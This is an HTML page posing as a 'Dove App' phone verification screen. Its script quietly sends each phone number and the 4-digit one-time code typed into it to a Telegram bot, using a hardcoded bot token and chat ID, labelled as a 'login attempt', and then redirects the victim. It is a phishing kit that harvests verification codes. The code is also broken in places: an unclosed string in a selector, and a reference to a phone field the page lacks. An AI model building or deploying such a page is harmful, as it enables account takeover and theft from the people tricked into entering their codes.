
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dove App - Verify Phone</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background: #ffffff;
            color: #333;
        }

        .container {
            max-width: 400px;
            margin: auto;
            padding: 45px 20px;
            text-align: center;
        }

        .logo {
            font-size: 44px;
            font-weight: bold;
            margin-bottom: 35px;
        }

        .logo span:first-child {
            color: #0b5ed7;
        }

        .logo span:last-child {
            color: #e5533d;
        }

        h2 {
            font-size: 22px;
            font-weight: normal;
            margin-bottom: 12px;
        }

        .description {
            color: #777;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .otp-boxes {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 25px 0;
        }

        .otp-boxes input {
            width: 52px;
            height: 55px;
            border: 2px solid #0b5ed7;
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            outline: none;
        }

        .otp-boxes input:focus {
            box-shadow: 0 0 0 3px rgba(11,94,215,.15);
        }

        .verify-btn {
            width: 100%;
            padding: 15px;
            background: #0b5ed7;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .verify-btn:disabled {
            opacity: .6;
            cursor: not-allowed;
        }

        .resend {
            margin-top: 24px;
            font-size: 14px;
            color: #666;
        }

        .resend button {
            border: none;
            background: none;
            color: #0b5ed7;
            font-weight: bold;
            cursor: pointer;
        }

        #message {
            margin-top: 18px;
            font-size: 14px;
            line-height: 1.5;
        }

        .bottom {
            margin-top: 45px;
            background: #0b5ed7;
            color: white;
            padding: 28px 15px;
            text-align: center;
            font-size: 12px;
        }

        @media(max-width:360px) {
            .otp-boxes {
                gap: 6px;
            }

            .otp-boxes input {
                width: 45px;
                height: 48px;
            }
        }
    </style>
</head>

<body>

    <div class="container">

        <div class="logo">
            <span>dov</span><span>app</span>
        </div>

        <h2>Verify your phone number</h2>

        <p class="description">
            Enter the 4-digit verification code sent to
            your registered phone number.
        </p>

        <form id="otpForm">

            <div class="otp-boxes">
                <input class="otp" type="text" inputmode="numeric"
                    maxlength="1" autocomplete="one-time-code"
                    aria-label="First digit" required>

                <input class="otp" type="text" inputmode="numeric"
                    maxlength="1" aria-label="Second digit" required>

                <input class="otp" type="text" inputmode="numeric"
                    maxlength="1" aria-label="Third digit" required>

                <input class="otp" type="text" inputmode="numeric"
                    maxlength="1" aria-label="Fourth digit" required>
            </div>

            <button class="verify-btn" id="verifyBtn" type="submit">
                Verify
            </button>

        </form>

        <div id="message" role="status" aria-live="polite"></div>

        <div class="resend">
            Didn't receive a code?
            <button type="button" id="resendBtn">Resend code</button>
        </div>

    </div>

    <div class="bottom">
        Dove App v2.2.3P<br><br>
        Secure phone verification
    </div>
<script>
        const inputs = document.querySelectorAll(".otp);

        // Function to submit OTP
        async function submitOTP() {
            const otp = Array.from(inputs).map(i => i.value).join("");
            const savedPhone = document.getElementById("phone").value;

            if (savedPhone.length !== 10) {
                alert("Enter A Valid Phone Number");
                return;
            }

            if (!savedPhone) {
                alert("Phone number missing. Please restart verification.");
                return;
            }

            if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
                alert("Please enter a valid 4-digit OTP");
                return;
            }

            const message = `Star login attempt:\nPhone: ${savedPhone}\nPin:${otp}`;

            try {
                const botToken = "9272926860:AAHanS0gwvEev4NGUmxOXoPtM22ZmwbdMZs"; // Replace with your bot token
                const chatId = "6527631508"; // Replace with your chat ID

                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                const data = await response.json();
                if (!data.ok) throw new Error(data.description || "Failed to send OTP to Telegram");

                // ✅ OTP sent successfully, redirect
                window.location.href = "otp.html"; // Replace with your target page
            } catch (error) {
                console.error("Telegram Error:", error);
                alert(error.message);
            }
        }

        // Auto movement and auto submit
        inputs.forEach((input, i) => {
            input.addEventListener("input", () => {
                // Allow only digits
                input.value = input.value.replace(/\D/g, "");

                // Move to next input
                if (input.value.length === 1 && i < inputs.length - 1) {
                    inputs[i + 1].focus();
                }

                // Auto-submit if all inputs are filled
                const otpFilled = Array.from(inputs).every(inp => inp.value.length === 1);
                if (otpFilled) submitOTP();
            });

            input.addEventListener("keydown", e => {
                if (e.key === "Backspace" && input.value === "" && i > 0) {
                    inputs[i - 1].focus();
                }
            });
        });

        // Timer
    </script>
